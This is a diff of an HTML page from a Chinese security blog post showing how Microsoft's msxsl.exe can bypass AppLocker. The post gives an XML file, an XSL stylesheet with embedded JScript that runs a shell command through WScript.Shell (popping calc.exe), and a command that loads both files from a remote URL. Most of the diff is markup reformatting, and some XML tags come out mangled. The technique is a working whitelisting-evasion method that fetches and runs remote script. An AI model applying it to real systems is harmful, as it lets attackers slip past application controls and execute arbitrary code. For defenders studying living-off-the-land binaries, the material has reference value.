@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -109,7 +92,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bypass AppLocker With MSXSL.EXE">
 <meta property="og:url" content="https://evi1cg.github.io/archives/AppLocker_Bypass_MSXSL.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:site_name" content="Evi1cg's blog">
 <meta property="og:description" content="关于XSLT之前已经有几篇文章进行介绍了，Hack With XSLT，XXE with XSL，Xsl Exec Webshell ，今天分享一个通过MSXSL.exe绕过Applocker的方法。msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。下载地址为：戳我 msxsl.exe 需要接受两个文件，XML及XSL文件，命令">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/07/3217517059.gif">
@@ -497,12 +480,12 @@
       
 
       
-        <p>关于XSLT之前已经有几篇文章进行介绍了，<a href="https://evi1cg.github.io/archives/Hack_With_XSLT.html">Hack With XSLT</a>，<a href="https://evi1cg.github.io/archives/xxe_with_xsl.html">XXE with XSL</a>，<a href="https://evi1cg.github.io/archives/Xsl_Exec_Webshell.html">Xsl Exec Webshell</a> ，今天分享一个通过MSXSL.exe绕过Applocker的方法。<br>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714" target="_blank" rel="noopener">戳我</a></p>
-<p>msxsl.exe 需要接受两个文件，XML及XSL文件，命令行操作如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl<span class="selector-class">.exe</span> demo<span class="selector-class">.xml</span> exec.xsl</span><br></pre></td></tr></table></figure></p>
-<p>demo.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">customers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">customer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Microsoft<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">customer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">customers</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>exec.xsl<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">"http://mycompany.com/mynamespace"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span>=<span class="string">"JScript"</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">   function xml(nodelist) &#123;</span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line"> </span><br><span class="line">   &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:xml(.)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+        <meta name="generator" content="Hexo 3.9.0"><p>关于XSLT之前已经有几篇文章进行介绍了，<a href="https://evi1cg.github.io/archives/Hack_With_XSLT.html">Hack With XSLT</a>，<a href="https://evi1cg.github.io/archives/xxe_with_xsl.html">XXE with XSL</a>，<a href="https://evi1cg.github.io/archives/Xsl_Exec_Webshell.html">Xsl Exec Webshell</a> ，今天分享一个通过MSXSL.exe绕过Applocker的方法。<br>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714" target="_blank" rel="noopener">戳我</a></p>
+<p>msxsl.exe 需要接受两个文件，XML及XSL文件，命令行操作如下：<br></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl<span class="selector-class">.exe</span> demo<span class="selector-class">.xml</span> exec.xsl</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>demo.xml<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!--?xml version="1.0"?--></span></span><br><span class="line"><span class="meta"><!--?xml-stylesheet type="text/xsl" href="exec.xsl" ?--></span></span><br><span class="line"><span class="tag"><<span class="name">customers</span>></span></span><br><span class="line"><span class="tag"><<span class="name">customer</span>></span></span><br><span class="line"><span class="tag"><<span class="name">name</span>></span>Microsoft<span class="tag">name</span>></span><br><span class="line"><span class="tag">customer</span>></span><br><span class="line"><span class="tag">customers</span>></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>exec.xsl<br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><!--?xml version='1.0'?--></span></span><br><span class="line"><span class="tag"><<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:user</span>=<span class="string">"http://mycompany.com/mynamespace"</span>></span></span><br><span class="line"> </span><br><span class="line"><span class="tag"><<span class="name">msxsl:script</span> <span class="attr">language</span>=<span class="string">"JScript"</span> <span class="attr">implements-prefix</span>=<span class="string">"user"</span>></span></span><br><span class="line">   function xml(nodelist) {</span><br><span class="line">var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");</span><br><span class="line">   return nodelist.nextNode().xml;</span><br><span class="line"> </span><br><span class="line">   }</span><br><span class="line"><span class="tag">msxsl:script</span>></span><br><span class="line"><span class="tag"><<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>></span></span><br><span class="line">   <span class="tag"><<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:xml(.)"</span>/></span></span><br><span class="line"><span class="tag">xsl:template</span>></span><br><span class="line"><span class="tag">xsl:stylesheet</span>></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://evi1cg.github.io/usr/uploads/2017/07/3217517059.gif" alt="1.gif"></p>
-<p>同样的，msxsl.exe可以远程加载，具体方式如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl https:<span class="regexp">//</span>evi1cg.github.io<span class="regexp">/scripts/</span>demo.xml https:<span class="regexp">//</span>evi1cg.github.io<span class="regexp">/scripts/</span>exec.xsl</span><br></pre></td></tr></table></figure></p>
+<p>同样的，msxsl.exe可以远程加载，具体方式如下：<br></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msxsl https:<span class="regexp">//</span>evi1cg.github.io<span class="regexp">/scripts/</span>demo.xml https:<span class="regexp">//</span>evi1cg.github.io<span class="regexp">/scripts/</span>exec.xsl</span><br></pre></td></tr></tbody></table></figure><p></p>
 
       
     </div>
@@ -841,7 +824,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -852,7 +835,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -863,7 +846,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -874,7 +857,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -909,7 +892,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1591,5 +1574,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
